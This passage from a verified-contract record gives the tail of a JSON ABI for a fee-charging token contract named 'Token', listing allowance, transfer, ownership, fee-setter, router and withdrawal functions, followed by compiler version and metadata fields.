int256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"endBlockNum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fiveMinutesBlockNum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"genesisBlockNum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getGenesisFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getProfitTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getTopUserList\",\"outputs\":[{\"internalType\":\"address[25]\",\"name\":\"\",\"type\":\"address[25]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"numTokensSellToAddToLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"numTokensSellToTopUser\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"numTokensSellToWhiteList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"oneDayBlockNum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"oneHourBlockNum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"onlineAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"onlineBlockNum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"operationAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"perDayRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"perHourRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reduceGenesisFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"routerV2Address\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"burnFee\",\"type\":\"uint256\"}],\"name\":\"setBuyBurnFeePercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"con\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setErc20With\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setEthWith\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityFee\",\"type\":\"uint256\"}],\"name\":\"setLiquidityFeePercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setOnline\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"state\",\"type\":\"bool\"}],\"name\":\"setOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"rewardFee\",\"type\":\"uint256\"}],\"name\":\"setRewardFeePercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_swapPair\",\"type\":\"address\"}],\"name\":\"setRouter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"burnFee\",\"type\":\"uint256\"}],\"name\":\"setSellBurnFeePercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_sort\",\"type\":\"uint256\"}],\"name\":\"setTopUserList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"whiteFee\",\"type\":\"uint256\"}],\"name\":\"setWhiteFeePercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapRouter\",\"outputs\":[{\"internalType\":\"contract IPancakeRouter02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBurn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"usdtToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Token", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d912547034c0ae78f33068bf11eed25509d17eb826453df450b9282f860fb876"}